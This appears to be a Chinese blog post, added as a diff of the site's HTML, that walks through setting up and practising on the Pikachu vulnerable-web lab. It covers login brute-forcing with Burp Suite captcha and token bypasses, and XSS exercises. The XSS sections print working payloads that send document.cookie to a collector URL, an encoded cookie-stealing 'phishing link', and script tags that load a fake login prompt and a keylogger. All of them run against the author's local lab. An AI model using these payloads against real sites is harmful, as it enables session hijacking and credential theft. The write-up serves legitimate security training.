@@ -1,0 +1,1215 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="302">
+  <meta name="keywords" content="">
+  <title>pikachu靶机环境搭建及使用 - 302</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Doing's NOTE</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+		 style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+                pikachu靶机环境搭建及使用
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-06 18:08" pubdate>
+        2021年1月6日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      111
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">pikachu靶机环境搭建及使用</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="pikachu靶机环境搭建及使用"><a href="#pikachu靶机环境搭建及使用" class="headerlink" title="pikachu靶机环境搭建及使用"></a>pikachu靶机环境搭建及使用</h1><h2 id="pikachu靶机环境搭建"><a href="#pikachu靶机环境搭建" class="headerlink" title="pikachu靶机环境搭建"></a>pikachu靶机环境搭建</h2><p>1、pikachu文件地址如下</p>
+<p>git clone <a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+<p>2、进入pikachu文件目录</p>
+<p>运行<code>docker build -t pikachu .</code></p>
+<p><a href="https://imgchr.com/i/smmgjx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmgjx.png" srcset="/img/loading.gif" alt="smmgjx.png"></a></p>
+<p>3、下载完成后，查看镜像，<code>docker image ls</code>，发现pikachu镜像ID。</p>
+<p><a href="https://imgchr.com/i/smmcg1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmcg1.png" srcset="/img/loading.gif" alt="smmcg1.png"></a></p>
+<p>4、然后启动容器<code>docker run -it -d -p 8000:80 4b</code></p>
+<p><a href="https://imgchr.com/i/smmWDK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmWDK.png" srcset="/img/loading.gif" alt="smmWDK.png"></a></p>
+<p>皮卡丘运行成功。</p>
+<p>5、打开浏览器访问<a href="http://192.168.2.137:8000/index.php" target="_blank" rel="noopener">http://192.168.2.137:8000/index.php</a> 进行初始化，先修改配置文件再进行初始化操作。图片忘记截了。</p>
+<p>进入容器修改配置文件连接mysql数据库<code>docker exec -it 07 /bin/bash</code></p>
+<p>连接数据库，修改root密码</p>
+<blockquote>
+<p>SET PASSWORD FOR ‘root’@’localhost’ = PASSWORD(‘newpass’);</p>
+</blockquote>
+<p>修改配置文件<code>vi app/inc/config.inc.php</code>。修改连接数据库的用户名密码即可。</p>
+<p><a href="https://imgchr.com/i/smm4ED" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm4ED.png" srcset="/img/loading.gif" alt="smm4ED.png"></a></p>
+<p>Pikachu有一个xss后台，也需要配置文件连接数据库步骤都一样。<code>vi app/pkxss/inc/config.inc.php</code></p>
+<p><a href="https://imgchr.com/i/smmRu6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmRu6.png" srcset="/img/loading.gif" alt="smmRu6.png"></a></p>
+<p>设置完成后安装即可。</p>
+<p><a href="https://imgchr.com/i/smmfHO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmfHO.png" srcset="/img/loading.gif" alt="smmfHO.png"></a></p>
+<p>xss后台初始化完成。</p>
+<p><a href="https://imgchr.com/i/smm5Ue" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm5Ue.png" srcset="/img/loading.gif" alt="smm5Ue.png"></a></p>
+<p>至此，pikachu靶场搭建完成。</p>
+<blockquote>
+<p>在使用过程中，docker 容器关闭后，再启用，本地访问映射的端口无法连接。</p>
+<p>经过不断地尝试，发现最简单的解决方法为重启docker服务。</p>
+<p><code>service docker restart</code></p>
+</blockquote>
+<h2 id="pikachu靶场练习"><a href="#pikachu靶场练习" class="headerlink" title="pikachu靶场练习"></a>pikachu靶场练习</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><blockquote>
+<p>“暴力破解”是一种攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。             其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。</p>
+<p>为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。         </p>
+<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。             </p>
+<p>我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。             </p>
+<p>这里的认证安全策略, 包括：</p>
+<ol>
+<li>是否要求用户设置复杂的密码；</li>
+<li>是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</li>
+<li>是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</li>
+<li>是否采用了双因素认证；<br>…等等。</li>
+</ol>
+</blockquote>
+<h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>可直接进行暴力破解。没有限制。</p>
+<h4 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h4><p>前端测试发现每次登录都会提示用户名密码不存在<strong>并刷新验证码</strong>。原来这样也是可以绕过的，果然还是太菜了。</p>
+<p><a href="https://imgchr.com/i/smmTCd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmTCd.png" srcset="/img/loading.gif" alt="smmTCd.png"></a></p>
+<p><strong>确认验证码的有效性。当不输入验证码或者输入验证码错误时。看前端是否验证。</strong></p>
+<p>随便输入账户密码进行抓包。</p>
+<p><a href="https://imgchr.com/i/smmI4H" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmI4H.png" srcset="/img/loading.gif" alt="smmI4H.png"></a></p>
+<p>再次发送数据包，提示验证码错误，说明验证码已更新。</p>
+<p><a href="https://imgchr.com/i/smmHgI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmHgI.png" srcset="/img/loading.gif" alt="smmHgI.png"></a></p>
+<p>将抓到的数据包发送到repeater模块中，修改验证码，看后台是否对验证码进行了验证。提交验证码为空，删除验证码，提示验证码不能为空。</p>
+<p><a href="https://imgchr.com/i/smmbvt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmbvt.png" srcset="/img/loading.gif" alt="smmbvt.png"></a></p>
+<p>接下来验证验证码是否存在不过期的问题。刷新页面，获取新的验证码，不在前台进行登录，此时将验证码修改为前端显示的验证码。提示用户名密码不存在。</p>
+<p><a href="https://imgchr.com/i/smmLKP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmLKP.png" srcset="/img/loading.gif" alt="smmLKP.png"></a></p>
+<p>更改用户名或者密码的其中一个，正常的应该返回验证码不正确；然而返回的结果却与之前的相同，均为账号或者密码不正确。这说明验证码被重复使用，存在不过期的问题，所以我们就可以进行暴力破解。</p>
+<p><a href="https://imgchr.com/i/smmODf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmODf.png" srcset="/img/loading.gif" alt="smmODf.png"></a></p>
+<p>使用暴力破解模块进行爆破。</p>
+<p><a href="https://imgchr.com/i/smmXb8" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmXb8.png" srcset="/img/loading.gif" alt="smmXb8.png"></a></p>
+<p>爆破成功</p>
+<p><a href="https://imgchr.com/i/smm78A" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm78A.png" srcset="/img/loading.gif" alt="smm78A.png"></a></p>
+<h4 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h4><p>这个抓包后，验证码未刷新，可以进行暴力破解。</p>
+<p><a href="https://imgchr.com/i/smmvVS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmvVS.png" srcset="/img/loading.gif" alt="smmvVS.png"></a></p>
+<h4 id="token验证绕过"><a href="#token验证绕过" class="headerlink" title="token验证绕过"></a>token验证绕过</h4><blockquote>
+<p>token并不能防爆破。</p>
+<p>我们观察源代码（工具—Web开发者—Firebug—打开Firebug），点击login提交时，页面不仅提交username和password，还提交了一个hidden属性的token值（每次提交要验证token值（每次更新），表面上可以防止暴力破解，但后端每次产生的token以明文形式传到前端，漏洞就这样产生了。</p>
+</blockquote>
+<p>抓包发现存在token参数。重复使用提示csrf token error。</p>
+<p><a href="https://imgchr.com/i/smmxUg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmxUg.png" srcset="/img/loading.gif" alt="smmxUg.png"></a></p>
+<p>查看网页源代码，获取隐藏的token值。每次暴力破解之前，获取一下token值，然后填到字典里面，就可以进行暴力破解。</p>
+<p><a href="https://imgchr.com/i/smmz5Q" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmz5Q.png" srcset="/img/loading.gif" alt="smmz5Q.png"></a></p>
+<p>使用 burpsuite 的宏功能，自动把登陆页的token值抓取出来填入登陆请求，创建宏，获取 token 值。</p>
+<p>详细步骤<a href="https://www.cnblogs.com/ApricityJ/p/12628962.html" target="_blank" rel="noopener">https://www.cnblogs.com/ApricityJ/p/12628962.html</a></p>
+<p>这里借用参考链接的图。</p>
+<p><a href="https://imgchr.com/i/smn98s" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smn98s.png" srcset="/img/loading.gif" alt="smn98s.png"></a></p>
+<p>在弹出来的 Macro Recorder 中选择包含要获取的 token 的页面，点击ok。会进入如下界面，单击。</p>
+<p><a href="https://imgchr.com/i/smnpCj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smnpCj.png" srcset="/img/loading.gif" alt="smnpCj.png"></a></p>
+<p><a href="https://imgchr.com/i/s3IEV0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3IEV0.png" srcset="/img/loading.gif" alt="s3IEV0.png"></a></p>
+<p>配置 Macros 用鼠标选中 token 值，burpsuite 会自动填写开始标记以及结束标记，并且写上 Parameter name 为 token，注意这里的参数名 token 是与要爆破页面里的 token 名称一致。</p>
+<p><a href="https://imgchr.com/i/s3I1q1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3I1q1.png" srcset="/img/loading.gif" alt="s3I1q1.png"></a></p>
+<p>到此宏建立完成。接着创建 Session Handling Rules 然后在 Session Handling Rules 里面新建一条规则以执行宏：一直点OK到这个界面</p>
+<p><a href="https://imgchr.com/i/s3I2Rg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3I2Rg.png" srcset="/img/loading.gif" alt="s3I2Rg.png"></a></p>
+<p><a href="https://imgchr.com/i/s3IgJS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3IgJS.png" srcset="/img/loading.gif" alt="s3IgJS.png"></a></p>
+<p><a href="https://imgchr.com/i/s3Ici8" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Ici8.png" srcset="/img/loading.gif" alt="s3Ici8.png"></a></p>
+<p>点击ok以后点击下图Scope</p>
+<p><a href="https://imgchr.com/i/smmJ9s" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmJ9s.png" srcset="/img/loading.gif" alt="smmJ9s.png"></a></p>
+<p>设置宏的影响范围， Tools Scope 选中 Repeater、Intruder 就行了，其它模块可根据实际需要勾选。</p>
+<p><a href="https://imgchr.com/i/smmtcq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmtcq.png" srcset="/img/loading.gif" alt="smmtcq.png"></a></p>
+<p>将爆破线程设置为1（因为如果是多线程它们会同时刷新token，就无法取得正确的token）</p>
+<p><a href="https://imgchr.com/i/smmY3n" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmY3n.png" srcset="/img/loading.gif" alt="smmY3n.png"></a></p>
+<p>爆破成功。token无法防止暴力破解。</p>
+<p><a href="https://imgchr.com/i/s3TFA0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3TFA0.png" srcset="/img/loading.gif" alt="s3TFA0.png"></a></p>
+<p>另一种提取token方式<a href="https://blog.csdn.net/qq_37077262/article/details/103013368" target="_blank" rel="noopener">https://blog.csdn.net/qq_37077262/article/details/103013368</a> ，没有进行操作验证，作为参考。</p>
+<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><blockquote>
+<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
+<ol>
+<li>反射性XSS;</li>
+<li>存储型XSS;</li>
+<li>DOM型XSS;</li>
+</ol>
+<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>          输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>          输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
+</blockquote>
+<h4 id="反射型XSS-GET"><a href="#反射型XSS-GET" class="headerlink" title="反射型XSS(GET)"></a>反射型XSS(GET)</h4><p>先随便输一个字符串看看，发现输出信息。</p>
+<p><a href="https://imgchr.com/i/smm3NQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm3NQ.png" srcset="/img/loading.gif" alt="smm3NQ.png"></a></p>
+<p>插入alert弹窗。发现长度被限制为20。F12修改前端代码完成修改。</p>
+<pre><code class="hljs angelscript">&lt;p <span class="hljs-keyword">class</span>="<span class="hljs-symbol">notice</span>"&gt;<span class="hljs-symbol">who</span> <span class="hljs-symbol">is</span> <span class="hljs-symbol">xxxx,<span class="hljs-symbol">i</span></span> <span class="hljs-symbol">don</span>'<span class="hljs-symbol">t</span> <span class="hljs-symbol">care</span>!&lt;/<span class="hljs-symbol">p</span>&gt;</code></pre>
+
+<p>想要完成xss攻击，要将该语句先闭合。</p>
+<p><a href="https://imgchr.com/i/smm8hj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm8hj.png" srcset="/img/loading.gif" alt="smm8hj.png"></a></p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/smmNj0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmNj0.png" srcset="/img/loading.gif" alt="smmNj0.png"></a></p>
+<p>弹cookie。</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/smmdBT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmdBT.png" srcset="/img/loading.gif" alt="smmdBT.png"></a></p>
+<hr>
+<p><strong>使用XSS后台获取用户cookie</strong></p>
+<p><a href="https://imgchr.com/i/smmwHU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmwHU.png" srcset="/img/loading.gif" alt="smmwHU.png"></a></p>
+<p>修改pikachu靶机获取cookie.php。文件绝对路径为<code>/var/www/html/pkxss/xcookie/cookie.php</code></p>
+<p>修改地址为一个可信的页面。我们这里设置为百度地址。</p>
+<p><a href="https://imgchr.com/i/smmBEF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmBEF.png" srcset="/img/loading.gif" alt="smmBEF.png"></a></p>
+<p>修改输入框的长度限制，在输入框插入XSS代码。</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location = <span class="hljs-string">'http://192.168.2.137:8000/pkxss/xcookie/cookie.php?cookie='</span> + <span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p>提交成功后，页面跳转为baidu.com。</p>
+<p><a href="https://imgchr.com/i/smmr4J" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmr4J.png" srcset="/img/loading.gif" alt="smmr4J.png"></a></p>
+<p>XSS后台也获取到cookie记录。</p>
+<p><a href="https://imgchr.com/i/smmDN4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmDN4.png" srcset="/img/loading.gif" alt="smmDN4.png"></a></p>
+<p>钓鱼链接：受害者点击该链接，cookie被盗取。</p>
+<pre><code class="hljs xquery">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span>/vul/xss/xss_reflected_get.php?message=<span class="hljs-meta">%3Cscript</span><span class="hljs-meta">%3Edocument</span>.location+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%27http</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%2F192</span>.<span class="hljs-number">168.2</span>.<span class="hljs-number">137</span><span class="hljs-meta">%3A8000</span><span class="hljs-meta">%2Fpkxss</span><span class="hljs-meta">%2Fxcookie</span><span class="hljs-meta">%2Fcookie</span>.php<span class="hljs-meta">%3Fcookie</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%27</span>+<span class="hljs-meta">%2B</span><span class="hljs-built_in">+document</span>.cookie<span class="hljs-meta">%3B</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%2Fscript</span><span class="hljs-meta">%3E</span>&amp;submit=submit</code></pre>
+
+<p><a href="https://imgchr.com/i/snDgcn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDgcn.png" srcset="/img/loading.gif" alt="snDgcn.png"></a></p>
+<hr>
+<h4 id="反射型XSS-POST"><a href="#反射型XSS-POST" class="headerlink" title="反射型XSS(POST)"></a>反射型XSS(POST)</h4><p>拿之前爆破的账户密码登陆后，然后随便输入一个数据进行提交一下。</p>
+<p>插入xss代码。<code>&lt;/p&gt;&lt;script&gt;alert(&#39;post&#39;)&lt;/script&gt;</code>产生弹窗。</p>
+<p>我们可以看到并没有在URL中进行提交，说明我们并不能将我们的恶意代码嵌入到URL中发送。</p>
+<p><a href="https://imgchr.com/i/smmyC9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smmyC9.png" srcset="/img/loading.gif" alt="smmyC9.png"></a></p>
+<p><strong>获取cookie。</strong><code>&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><a href="https://imgchr.com/i/smm63R" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/07/smm63R.png" srcset="/img/loading.gif" alt="smm63R.png"></a></p>
+<hr>
+<p><strong>使用XSS后台获取用户cookie</strong></p>
+<p>输入框插入xss恶意代码。</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location = <span class="hljs-string">'http://192.168.2.137:8000/pkxss/xcookie/cookie.php?cookie='</span> + <span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snD2Xq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snD2Xq.png" srcset="/img/loading.gif" alt="snD2Xq.png"></a></p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDWn0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDWn0.png" srcset="/img/loading.gif" alt="snDWn0.png"></a></p>
+<p><strong>XSS钓鱼</strong></p>
+<p>修改钓鱼页面</p>
+<p><a href="https://imgchr.com/i/snDfBV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDfBV.png" srcset="/img/loading.gif" alt="snDfBV.png"></a></p>
+<p>插入恶意代码，弹出登录框</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.2.137:8000/pkxss/xfish/fish.php"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDh7T" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDh7T.png" srcset="/img/loading.gif" alt="snDh7T.png"></a></p>
+<p>输入用户名密码。</p>
+<p><a href="https://imgchr.com/i/snD5AU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snD5AU.png" srcset="/img/loading.gif" alt="snD5AU.png"></a></p>
+<p>钓鱼成功。</p>
+<hr>
+<p><strong>键盘记录</strong></p>
+<blockquote>
+<p>跨域</p>
+<p>当协议、主机(主域名,子域名)、端口中的任意一个不相同时,称为不同域。</p>
+<p>我们把不同的域之间请求数据的操作，成为跨域操作。</p>
+</blockquote>
+<p>跨域-同源策略<br>而为了安全考虑,所有的浏览器都约定了“同源策略”, 同源策略规定, 两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。<br>如果想要跨域操作，则需要管理员进行特殊的配置。<br>比如通过: header( “Access -Control-Allow-Origin:x.com” )指定。<br>Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">Src</span>= <span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//js,加载到本地执行
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>= <span class="hljs-string">"..."</span> &gt;</span>//图片
+<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>= <span class="hljs-string">"..."</span>&gt;</span> //css 
+<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">Src</span>= <span class="hljs-string">"..."</span> &gt;</span> //任意资源</code></pre>
+
+<hr>
+<p>修改pkxss/rkeypress/rk.js 源代码，将地址改为攻击者xss后台地址。</p>
+<p><a href="https://imgchr.com/i/snDINF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDINF.png" srcset="/img/loading.gif" alt="snDINF.png"></a></p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.2.137:8000/pkxss/rkeypress/rk.js "</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snD79J" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snD79J.png" srcset="/img/loading.gif" alt="snD79J.png"></a></p>
+<p>查看xss后台</p>
+<p><a href="https://imgchr.com/i/snDoh4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDoh4.png" srcset="/img/loading.gif" alt="snDoh4.png"></a></p>
+<blockquote>
+<p>由于我的靶机和xss后台搭建在一起，所以不会被同源策略所拦截。这里不再进行测试。</p>
+</blockquote>
+<p>若受害者和攻击者在不同域中，若要成功执行还要修改pkxss/rkeypress/rkserver.php文件设置允许被跨域访问。</p>
+<p><a href="https://imgchr.com/i/snDH39" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDH39.png" srcset="/img/loading.gif" alt="snDH39.png"></a></p>
+<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><h4 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h4><p>发送的内容未在前端展示，发送到后端。</p>
+<p><a href="https://imgchr.com/i/snDqj1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDqj1.png" srcset="/img/loading.gif" alt="snDqj1.png"></a></p>
